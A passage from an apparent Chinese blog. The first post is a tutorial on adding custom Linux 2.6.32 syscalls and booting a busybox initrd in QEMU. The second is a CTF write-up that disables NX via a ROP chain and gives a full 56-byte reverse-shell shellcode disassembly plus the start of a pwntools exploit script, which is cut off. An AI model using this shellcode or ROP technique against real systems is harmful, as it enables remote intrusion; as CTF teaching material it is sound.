class="line">make ARCH=i386   </span><br><span class="line">make ARCH=i386 modules_install   </span><br><span class="line">make ARCH=i386 install</span><br></pre></td></tr></table></figure></p>
<h1 id="0x03-增加syscall"><a href="#0x03-增加syscall" class="headerlink" title="0x03:增加syscall"></a>0x03:增加syscall</h1><p>增加syscall的方式和之前文章写的差不多，<br>只是这次内核版本更低，所以更简单一点。我这里添加了两个系统调用进去。</p>
<h2 id="1-在syscall-table中添加信息"><a href="#1-在syscall-table中添加信息" class="headerlink" title="1. 在syscall table中添加信息"></a>1. 在syscall table中添加信息</h2><p>文件 arch/x86/kernel/syscall_table_32.S中添加自己的调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.long sys_muhe_test</span><br><span class="line">.long sys_hello</span><br></pre></td></tr></table></figure>
<h2 id="2-定义syscall的宏"><a href="#2-定义syscall的宏" class="headerlink" title="2. 定义syscall的宏"></a>2. 定义syscall的宏</h2><p>文件arch/x86/include/asm/unistd_32.h中添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_hello 337</span><br><span class="line">#define __NR_muhe_test    338</span><br><span class="line">#ifdef __KERNEL__</span><br><span class="line">#define NR_syscalls 339</span><br></pre></td></tr></table></figure>
<p>要注意NR_syscalls要修改成现有的调用数目，<br>比如原来有0~336一共337个调用，<br>现在增加了两个，那就改成339。</p>
<h2 id="3-添加函数定义"><a href="#3-添加函数定义" class="headerlink" title="3. 添加函数定义"></a>3. 添加函数定义</h2><p>文件include/linux/syscalls.h</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage long sys_muhe_test(int arg0);</span><br><span class="line">asmlinkage long sys_hello(void);</span><br></pre></td></tr></table></figure>
<h2 id="4-编写syscall代码"><a href="#4-编写syscall代码" class="headerlink" title="4. 编写syscall代码"></a>4. 编写syscall代码</h2><p>新建目录放自定义syscall的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test [2:43:06] </span><br><span class="line">$ cat muhe_test.c</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_muhe_test</span><span class="params">(<span class="keyword">int</span> arg0)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">"I am syscall"</span>);</span><br><span class="line">    printk(<span class="string">"syscall arg %d"</span>,arg0);</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">long</span>)arg0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_hello</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">"hello my kernel worldn"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test [2:43:12] </span><br><span class="line">$ cat Makefile</span><br><span class="line">obj-y := muhe_test.o</span><br></pre></td></tr></table></figure>
<h2 id="5-修改Makefile"><a href="#5-修改Makefile" class="headerlink" title="5. 修改Makefile"></a>5. 修改Makefile</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [2:44:59] </span><br><span class="line">$ cat Makefile| grep muhe</span><br><span class="line">core-y        += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ muhe_test/</span><br></pre></td></tr></table></figure>
<h2 id="6-编译"><a href="#6-编译" class="headerlink" title="6. 编译"></a>6. 编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j2</span><br></pre></td></tr></table></figure>
<h1 id="0x04-busybox编译配置"><a href="#0x04-busybox编译配置" class="headerlink" title="0x04: busybox编译配置"></a>0x04: busybox编译配置</h1><p>下载 busybox-1.20.1.tar.bz2:</p>
<p>wget   <a href="http://www.busybox.net/downloads/busybox-1.20.1.tar.bz2" target="_blank" rel="noopener">http://www.busybox.net/downloads/busybox-1.20.1.tar.bz2</a></p>
<p>编译</p>
<p>busybox用常规中的二进制编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>
<p>编译完成之后如下配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#将 proc 文件系统挂载到 /proc 目录中</span><br><span class="line">mount -t proc none /proc/</span><br><span class="line">#用于对内存控制与对驱动操作</span><br><span class="line">#将 sys 文件系统挂载到 /sys 的目录上</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">#mdev 是 busybox 自带的一个 udev ，它是用于系统启动和</span><br><span class="line">#热插拔或是动态加载驱动程序的时候，而自动产生设别节点的，</span><br><span class="line">#这句话如果不加上的话，这需要手动的 mknod 来挂载设备节点</span><br><span class="line">/sbin/mdev -s</span><br></pre></td></tr></table></figure>
<p>nano /etc/init</p>
<p>实际只要examples/inittab注释掉一些tty2::askfirst:-/bin/sh类似的行就可以了，因为我们只要一个控制台就可以了，文件内容只如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line"></span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line"></span><br><span class="line">::restart:/sbin/init</span><br><span class="line"></span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line"></span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line"></span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir dev</span><br><span class="line">sudo mknod dev/ttyAMA0 c 204 64</span><br><span class="line">sudo mknod dev/null c 1 3</span><br><span class="line">sudo mknod dev/console c 5 1</span><br><span class="line">$ find . | cpio -o --format=newc &gt; ./rootfs.img</span><br><span class="line">gzip -c rootfs.img &gt; rootfs.img.gz</span><br><span class="line"> </span><br><span class="line">$ qemu-system-i386 -kernel bzImage -initrd rootfs.img.gz -append &quot;root=/dev/ram rdinit=/sbin/init&quot;</span><br><span class="line">http://p0.qhimg.com/t016ecb6e221f21933d.png</span><br></pre></td></tr></table></figure>
<p>0x05: 测试系统调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [2:45:04] </span><br><span class="line">$ cd muhe_test_syscall_lib </span><br><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test_syscall_lib [2:51:48] </span><br><span class="line">$ cat muhe_test_syscall_lib.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;linux/unistd.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">int main(int argc,char **argv)</span><br><span class="line">&#123;</span><br><span class="line">        printf(&quot;n Diving to kernel levelnn&quot;);</span><br><span class="line">        syscall(337,1337);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test_syscall_lib [2:51:51] </span><br><span class="line">$ gcc muhe_test_syscall_lib.c -o muhe -static</span><br></pre></td></tr></table></figure>
<p>一定要静态链接，因为你进busybox链接库那些是没有的。<br>这里要注意，每次拷贝新文件到busybox的文件系统中去，<br>都要执行find . | cpio -o –format=newc &gt; ../rootfs.img去生成新的rootfs。</p>
<p>然后qemu起系统</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [2:53:33] </span><br><span class="line">$  qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd ../busybox-1.19.4/rootfs.img -append &quot;root=/dev/ram rdinit=/sbin/init&quot;</span><br><span class="line">http://p2.qhimg.com/t019e8e38063f5ebdac.png</span><br></pre></td></tr></table></figure>
<p>制作initrd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[cpp] view plain copy</span><br><span class="line"><span class="comment">/*hello.c*/</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);  </span><br><span class="line">　　<span class="comment">/*强制刷新输出，不然可能打印不出来*/</span>  </span><br><span class="line">    fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>initrd吧，全称是initial ramdisk,在内核启动的时候会先去加载的一种文件系统．</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[plain] view plain copy</span><br><span class="line">$    cd ..  </span><br><span class="line">#    使用静态编译链接．  </span><br><span class="line">$    gcc -static -o helloworld hello.c  </span><br><span class="line">#    将helloworld制作成cpio  </span><br><span class="line">$    echo helloworld | cpio -o --format=newc &gt; rootfs  </span><br><span class="line">1776 blocks  </span><br><span class="line">$    ls -la rootfs   </span><br><span class="line">-rw-rw-r-- 1 seijia seijia 909312 12月 21 13:15 rootfs  </span><br><span class="line">#　使用qemu进行启动  </span><br><span class="line">$    qemu-system-x86_64   \  </span><br><span class="line">     -kernel ./bzImage \  </span><br><span class="line">     -initrd ./rootfs  \  </span><br><span class="line">     -append &quot;root=/dev/ram rdinit=/helloworld&quot;</span><br></pre></td></tr></table></figure>
<pre><code>qemu的-kernel 和-initrd能够绕过bootload直接
对指定的kernel和ramdisk进行加载．
用-append进行额外的选项配置，
在这里我们把根目录直接设置成内存，
启动的init程序设置成放进去的helloworld．
用来检测是否编译成功能输出helloworld
</code></pre><h1 id="内核编译遇到的问题"><a href="#内核编译遇到的问题" class="headerlink" title="内核编译遇到的问题"></a>内核编译遇到的问题</h1><h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><p>问题描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">arch/x86/kernel/ptrace.c:1472:17: error: conflicting types for ‘syscall_trace_enter’</span><br><span class="line"> asmregparm long syscall_trace_enter(struct pt_regs *regs)</span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/vm86.h:130:0,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/processor.h:10,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/thread_info.h:22,</span><br><span class="line">                 from include/linux/thread_info.h:56,</span><br><span class="line">                 from include/linux/preempt.h:9,</span><br><span class="line">                 from include/linux/spinlock.h:50,</span><br><span class="line">                 from include/linux/seqlock.h:29,</span><br><span class="line">                 from include/linux/time.h:8,</span><br><span class="line">                 from include/linux/timex.h:56,</span><br><span class="line">                 from include/linux/sched.h:56,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:11:</span><br><span class="line">/home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/ptrace.h:145:13: note: previous declaration of ‘syscall_trace_enter’ was here</span><br><span class="line"> extern long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">             ^</span><br><span class="line">arch/x86/kernel/ptrace.c:1517:17: error: conflicting types for ‘syscall_trace_leave’</span><br><span class="line"> asmregparm void syscall_trace_leave(struct pt_regs *regs)</span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/vm86.h:130:0,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/processor.h:10,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/thread_info.h:22,</span><br><span class="line">                 from include/linux/thread_info.h:56,</span><br><span class="line">                 from include/linux/preempt.h:9,</span><br><span class="line">                 from include/linux/spinlock.h:50,</span><br><span class="line">                 from include/linux/seqlock.h:29,</span><br><span class="line">                 from include/linux/time.h:8,</span><br><span class="line">                 from include/linux/timex.h:56,</span><br><span class="line">                 from include/linux/sched.h:56,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:11:</span><br><span class="line">/home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/ptrace.h:146:13: note: previous declaration of ‘syscall_trace_leave’ was here</span><br><span class="line"> extern void syscall_trace_leave(struct pt_regs *);</span><br><span class="line">             ^</span><br><span class="line">make[2]: *** [arch/x86/kernel/ptrace.o] 错误 1</span><br><span class="line">make[1]: *** [arch/x86/kernel] 错误 2</span><br><span class="line">make: *** [arch/x86] 错误 2</span><br></pre></td></tr></table></figure>
<p>解决方案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">--- linux-2.6.32.59/arch/x86/include/asm/ptrace.h</span><br><span class="line">+++ fix_ptrace.o_compile_error/arch/x86/include/asm/ptrace.h</span><br><span class="line">@@ -130,6 +130,7 @@ </span><br><span class="line"> #ifdef __KERNEL__</span><br><span class="line"> </span><br><span class="line"> #include &lt;linux/init.h&gt;</span><br><span class="line">+#include &lt;linux/linkage.h&gt;</span><br><span class="line"> </span><br><span class="line"> struct cpuinfo_x86;</span><br><span class="line"> struct task_struct;</span><br><span class="line">@@ -142,8 +143,8 @@ </span><br><span class="line">       int error_code, int si_code);</span><br><span class="line"> void signal_fault(struct pt_regs *regs, void __user *frame, char *where);</span><br><span class="line"> </span><br><span class="line">-extern long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">-extern void syscall_trace_leave(struct pt_regs *);</span><br><span class="line">+extern asmregparm long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">+extern asmregparm void syscall_trace_leave(struct pt_regs *);</span><br><span class="line"> </span><br><span class="line"> static inline unsigned long regs_return_value(struct pt_regs *regs)</span><br><span class="line"> &#123;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="3-3-问题3"><a href="#3-3-问题3" class="headerlink" title="3.3 问题3"></a>3.3 问题3</h2><p>问题描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc: error: elf_i386: 没有那个文件或目录</span><br><span class="line">gcc: error: unrecognized command line option ‘-m’</span><br></pre></td></tr></table></figure>
<p>解决方案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arch/x86/vdso/Makefile</span><br><span class="line">VDSO_LDFLAGS_vdso.lds = -m elf_x86_64 -Wl,-soname=linux-vdso.so.1    -Wl,-z,max-page-size=4096 -Wl,-z,common-page-size=4096 把&quot;-m elf_x86_64&quot; 替换为 &quot;-m64&quot;</span><br><span class="line">VDSO_LDFLAGS_vdso32.lds = -m elf_i386 -Wl,-soname=linux-gate.so.1中的 &quot;-m elf_i386&quot; 替换为 &quot;-m32&quot;</span><br></pre></td></tr></table></figure>
<h2 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h2><p>问题描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">drivers/net/igbvf/igbvf.h15: error: duplicate member ‘page’</span><br><span class="line">struct page page;</span><br><span class="line">^</span><br><span class="line">make[3]: ** [drivers/net/igbvf/ethtool.o] 错误 1</span><br><span class="line">make[2]: [drivers/net/igbvf] 错误 2</span><br><span class="line">make[1]: [drivers/net] 错误 2</span><br><span class="line">make: * [drivers] 错误 2</span><br></pre></td></tr></table></figure></p>
<p>解决方案<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改名字重复</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *_<span class="title">page</span>;</span></span><br><span class="line">                    u64 page_dma;</span><br><span class="line">                    <span class="keyword">unsigned</span> <span class="keyword">int</span> page_offset;</span><br><span class="line">            &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="busybox编译问题"><a href="#busybox编译问题" class="headerlink" title="busybox编译问题"></a>busybox编译问题</h2><h3 id="2-1-问题一以及解决方案"><a href="#2-1-问题一以及解决方案" class="headerlink" title="2.1 问题一以及解决方案"></a>2.1 问题一以及解决方案</h3><p>错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  loginutils/passwd.c:188:12: error: ‘RLIMIT_FSIZE’ undeclared (first use in this function)</span><br><span class="line">setrlimit(RLIMIT_FSIZE, &amp;rlimit_fsize);</span><br></pre></td></tr></table></figure></p>
<p>解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$  vim include/libbb.h</span><br><span class="line">$  add a line #include &lt;sys/resource.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/resource.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="问题二以及解决方案"><a href="#问题二以及解决方案" class="headerlink" title="问题二以及解决方案"></a>问题二以及解决方案</h3><p>错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux/ext2_fs.h: 没有那个文件或目录</span><br></pre></td></tr></table></figure></p>
<p>解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux System Utilities ---&gt;</span><br><span class="line">    [ ] mkfs_ext2 </span><br><span class="line">    [ ] mkfs_vfat</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="程式描述"><a href="#程式描述" class="headerlink" title="程式描述"></a>程式描述</h1><pre><code>本題程式為statically linked，
在本題中明顯提供解題者一個stack buffer overflow的漏洞，
但因為程式有NX保護，必須使用ROP來控制程式行為。
在寫入的第12byte後開始覆蓋main的return address，
共計有88 bytes的overflow空間。
在程式read完以後便切斷該程式對client的連線，
即使拿到shell也無法操控該shell。
</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code>較簡單的解決辦法為建立一個reverse shell，
但如果全部只使用ROP最多只能放入22個gadgets
（包括argument與padding等等）。
所幸程式中可以找到_dl_make_stack_executable這個function以幫助解除NX保護，
接著便可以shellcode來產生一個reverse shell。
</code></pre><h1 id="解除stack的NX保護"><a href="#解除stack的NX保護" class="headerlink" title="解除stack的NX保護"></a>解除stack的NX保護</h1><pre><code>將__stack_prot設為7。
將__libc_stack_end的address放入eax中。
调用_dl_make_stack_executable。
解除NX後使用call esp的gadget來執行接著放在stack中的shellcode，截至目前為止最少共需占用8格stack，也就是32 bytes。

放入reverse shell的shellcode
建立reverse shell須執行socket、dup2、connect、execve等指令，
由於總共只有88 bytes的空間，且已用掉32 bytes來解除NX，
剩下只能放入最多56 bytes的shellcode來完成reverse shell。但網路上所提供的shellcode最短也要將近70 bytes，距離需求的56 bytes仍有不少距離。以下是兩種解決辦法，在比賽時我們是使用第一種解法：

想辦法硬縮，擠到56 bytes為止（我們使用的辦法）
由於網路上提供的shellcode必須夠general以應付幾乎所有程式state，
若能應用當時程式的某些state便可減少一點size。
由於fd中0、1、2皆已被close，
拿到的socket fd即已為0，因此只需進行一次dup2。
由於ebp可控（ebp的值會等於input中的第8~11 byte），
由此可以push ebp取代一次push 0xXXXXXXXX，省下4 bytes。
push port時使用ax中已有的數值（0x66），
port（big endian）將被固定為0x6600（26112）。
</code></pre><p>此為最後所使用的shellcode（共56 bytes），其中IP位置須位於ebp當中、port固定為26112：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> 0:   6a 01                   push   0x1</span><br><span class="line"> 2:   5b                      pop    ebx</span><br><span class="line"> 3:   99                      cdq</span><br><span class="line"> 4:   b0 66                   mov    al,0x66</span><br><span class="line"> 6:   52                      push   edx</span><br><span class="line"> 7:   53                      push   ebx</span><br><span class="line"> 8:   6a 02                   push   0x2</span><br><span class="line"> a:   89 e1                   mov    ecx,esp</span><br><span class="line"> c:   cd 80                   int    0x80</span><br><span class="line"> e:   5e                      pop    esi</span><br><span class="line"> f:   59                      pop    ecx</span><br><span class="line">10:   93                      xchg   ebx,eax</span><br><span class="line">11:   b0 3f                   mov    al,0x3f</span><br><span class="line">13:   cd 80                   int    0x80</span><br><span class="line">15:   b0 66                   mov    al,0x66</span><br><span class="line">17:   55                      push   ebp</span><br><span class="line">18:   66 50                   push   ax</span><br><span class="line">1a:   66 56                   push   si</span><br><span class="line">1c:   89 e1                   mov    ecx,esp</span><br><span class="line">1e:   0e                      push   cs</span><br><span class="line">1f:   51                      push   ecx</span><br><span class="line">20:   53                      push   ebx</span><br><span class="line">21:   89 e1                   mov    ecx,esp</span><br><span class="line">23:   b3 03                   mov    bl,0x3</span><br><span class="line">25:   cd 80                   int    0x80</span><br><span class="line">27:   b0 0b                   mov    al,0xb</span><br><span class="line">29:   59                      pop    ecx</span><br><span class="line">2a:   68 2f 73 68 00          push   0x68732f</span><br><span class="line">2f:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">34:   89 e3                   mov    ebx,esp</span><br><span class="line">36:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure></p>
<p>32位关闭nx<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_rop</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	a=ELF(<span class="string">'./kidding'</span>)</span><br><span class="line">	rop = ROP(a)</span><br><span class="line">	<span class="comment"># __stack_prot = 7</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop ecx'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__stack_prot'</span>))</span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop dword ptr [ecx]'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(<span class="number">7</span>)</span><br><span 